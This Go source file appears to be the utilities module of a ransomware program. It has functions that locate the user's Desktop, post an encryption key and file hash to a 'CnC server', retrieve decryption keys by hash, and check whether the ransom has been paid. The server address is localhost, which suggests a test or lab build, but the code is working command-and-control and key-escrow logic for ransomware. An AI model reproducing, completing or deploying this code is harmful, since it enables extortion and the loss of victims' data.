package utils

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const host string = "http://localhost:3000/api/"

func FindStringIndex(strArr []string, target string) int {
	c := len(strArr)
	for i := 0; i < c; i++ {
		if strings.Compare(target, strArr[i]) == 0 {
			return i
		}
	}
	return -1
}

func RemoveAtIndex(strArrPtr **[]string, index int) []string {
	strArr := **strArrPtr
	newArr := append(strArr[:index], strArr[index+1:]...)
	*strArrPtr = &newArr
	return newArr
}

func GetDesktopLocation() string {
	home, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	return filepath.Join(home, "Desktop")
}

func SendOffKey(hexKey string, hash string, paid bool, OfflineMode bool) (bool, error) {
	if OfflineMode {
		return false, errors.New("failed to contact CnC server")
	}
	jsonBody, err := json.Marshal(KeySendoffStruct{
		Key:  hexKey,
		Hash: hash,
		Paid: paid,
	})
	if err != nil {
		return false, err
	}
	resp, err := http.Post(host+"v2", "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	println(body)
	return resp.StatusCode == 200, err
}

func RetriveKeyByHash(hash string, OfflineMode bool) (string, error) {
	if OfflineMode {
		return "", errors.New("failed to contact CnC server")
	}
	resp, err := http.Get(host + "v2/" + hash)
	if err != nil || resp.StatusCode != 200 {
		return "", errors.New("failed to contact CnC server")
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	rawBody, _ := ioutil.ReadAll(resp.Body)
	response := unmarshalMessage(string(rawBody))
	if response.Status == string(ERROR) {
		return "", errors.New("failed to parse JSON")
	}
	if response.Status == string(UNPAID) {
		return response.Message, errors.New("ransom not paid")
	}
	return response.Key, nil
}

func unmarshalMessage(jsonString string) GetKeyResponse {
	var r GetKeyResponse
	err := json.Unmarshal([]byte(jsonString), &r)
	if err != nil {
		return GetKeyResponse{
			Key:     "",
			Status:  "ERROR",
			Message: "Failed to parse JSON",
		}
	}
	return r
}

func CheckIfServerIsOnline() bool {
	resp, err := http.Get(host + "test")
	if err != nil {
		return false
	}
	return resp.StatusCode == 200
}

func ObtainKey(hash string) ([]byte, error) {
	resp, err := http.Get(host + "v2/" + hash)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	println(body)
	return body, err
}
